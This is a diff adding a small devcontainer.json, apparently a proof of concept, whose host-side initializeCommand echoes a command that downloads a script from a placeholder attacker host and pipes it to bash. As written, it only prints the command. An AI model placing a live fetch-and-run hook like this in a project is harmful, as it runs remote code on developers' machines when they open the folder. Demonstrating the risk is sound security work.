@@ -1,0 +1,6 @@
+{
+ "name": "poc",
+ "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+ "initializeCommand": "echo 'curl -fsSL http://evil.example/s.sh | bash'",
+ "postCreateCommand": "npm install"
+}
